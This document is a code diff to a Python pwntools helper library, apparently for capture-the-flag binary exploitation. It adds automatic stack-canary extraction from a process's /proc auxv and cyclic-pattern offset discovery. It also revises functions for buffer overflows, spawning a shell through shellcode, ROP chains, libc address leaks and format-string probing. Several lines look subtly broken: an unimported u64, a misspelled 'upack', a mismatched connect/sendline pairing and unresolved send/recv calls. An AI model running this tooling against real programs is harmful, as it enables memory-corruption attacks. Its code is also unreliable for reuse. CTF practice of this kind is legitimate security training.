@@ -1,4 +1,4 @@
-from pwn import log, context, cyclic, unpack, log, asm, flat, rol, ror
+from pwn import log, context, cyclic, unpack, log, asm, flat, rol, ror, shellcraft, ROP, pwnlib
 import pwn
 import re
 import math
@@ -29,14 +29,14 @@ _IOFILE_VTABLE_OFFSETS = {
 }
 
 class PwnContext:    
-    def __init__(self, proc, elf, libc, binary, prefix, offset, canary):
+    def __init__(self, proc, elf, libc, binary, prefix):
         self.proc = proc
         self.elf = elf
         self.libc = libc
         self.binary = binary
         self.prefix = prefix
-        self.offset = offset
-        self.canary = canary
+        self._offset = None
+        self._canary = None
 
     def resolve(self, symbol, base=None):
         """Resolve a symbol to an address, with optional offset notation (e.g., 'main+0x10')"""
@@ -53,10 +53,52 @@ class PwnContext:
         else:
             addr = base.sym[symbol]
         return addr
+
+    @property
+    def canary(self):
+        if not self._canary and self.proc:
+            canary = 0x0
+            auxv = open(f"/proc/{self.proc.pid}/auxv", "rb").read()
+            word = context.bytes
+            for i in range(0, len(auxv), 2 * word):
+                a_type = u64(auxv[i:i+word])
+                a_val  = u64(auxv[i+word:i+2*word])
+
+                if a_type == 25:  # AT_RANDOM
+                    canary = u64(b'\x00'+self.proc.readmem(a_val+1, 7))
+                    break
+            self._canary = canary
+
+        return self._canary
+
+    @canary.setter
+    def canary(self, new_canary):
+        self._canary = new_canary
+        return self._canary
+
+    @property
+    def offset(self):
+        if not self._offset:
+            context.delete_corefiles = True
+            io = connect()
+            io.sendline(self.proc, cyclic(1000))
+            io.wait()
+            core = io.corefile
+            self._offset = cyclic.cyclic_find(core.fault_addr)
+            io.close()
+            log.info(f"{self.offset = }")
+
+        return self._offset
+
+    @offset.setter
+    def offset(self, new_offset):
+        self._offset = new_offset
+        return self._offset
     
     def leak(self, leak, leaked=0):
         start = leak.find(b'0x')
         end = 2
+
         if start > 0:
             leak = leak[start:]
             for i in leak[2:]:
@@ -65,8 +107,8 @@ class PwnContext:
             leak = leak[:end]
             leak = int(leak, 16)
         else:
-            len = context.bits//8
-            leak = leak.ljust(len, b'\x00')[:len]
+            word_size = context.bits//8
+            leak = leak.ljust(word_size, b'\x00')[:word_size]
             leak = unpack(leak, context.bits)
 
         leak -= leaked
@@ -75,6 +117,12 @@ class PwnContext:
 
     
     def check_leaks(self, leak):
+        if not self.proc:
+            return
+            
+        if leak == self.canary:
+            log.info(f"canary: leak = {leak:#x}")
+
         for m in self.proc.maps():
             if m.start <= leak <= m.end:
                 base = 0
@@ -128,28 +176,15 @@ class PwnContext:
         log.info(f"ROP :\n{rop.dump()}")
         return rop.chain()
 
-
-    def find_offset(self, data=cyclic(1000)):
-        context.delete_corefiles = True
-        self.proc = process(self.binary)
-        send(data)
-        self.proc.wait()
-        core = self.proc.corefile
-        self.offset = cyclic_find(core.fault_addr)
-        self.proc.close()
-        self.proc = None
-        log.info(f"{self.offset = }")
-
     def bof(self, data, **kwargs):
-        if self.offset is None:
-            self.find_offset()
+        offset = self.offset
         opt = kwargs.pop("opt", {})
         bp = kwargs.pop("bp", 0)
         opt |= {self.offset - context.bytes: bp}
         if self.elf.canary:
-            opt |= {self.offset - context.bytes * 2: self.canary}
+            opt |= {offset - context.bytes * 2: self.canary}
         payload = flat({self.offset: data} | opt, **kwargs)
-        self.send(payload)
+        send(payload)
 
     def ret2shellcode(self, addr, **kwargs):
         shellcode = asm(shellcraft.sh())
@@ -182,13 +217,13 @@ class PwnContext:
         else:
             payload = self.ropchain({func_plt: [func_got]})
         self.bof(payload, **kwargs)
-        leak = upack(self.recv())
+        leak = upack(recv())
         self.libc.address = leak - self.libc.sym[func]
 
     def format_string(self, n=100):
         payload = "A" * context.bytes + ".%p" * n
-        self.send(payload)
-        output = self.recv().split(".")
+        send(payload)
+        output = recv().split(".")
         log.info(f"format string : {output}")
         return output.index("0x" + "41" * context.bytes)
 
@@ -232,8 +267,9 @@ check_leaks = lambda *a, **k: (_require_ctx(), pwnctx.check_leaks(*a, **k))[1]
 resolve = lambda *a, **k: (_require_ctx(), pwnctx.resolve(*a, **k))[1]
 check_leaks = lambda *a, **k: (_require_ctx(), pwnctx.check_leaks(*a, **k))[1]
 
+offset = lambda *a, **k: (_require_ctx(), pwnctx.offset)[1]
+canary = lambda *a, **k: (_require_ctx(), pwnctx.canary)[1]
 ropchain = lambda *a, **k: (_require_ctx(), pwnctx.ropchain(*a, **k))[1]
-find_offset = lambda *a, **k: (_require_ctx(), pwnctx.find_offset(*a, **k))[1]
 bof = lambda *a, **k: (_require_ctx(), pwnctx.bof(*a, **k))[1]
 
 ret2shellcode = lambda *a, **k: (_require_ctx(), pwnctx.ret2shellcode(*a, **k))[1]
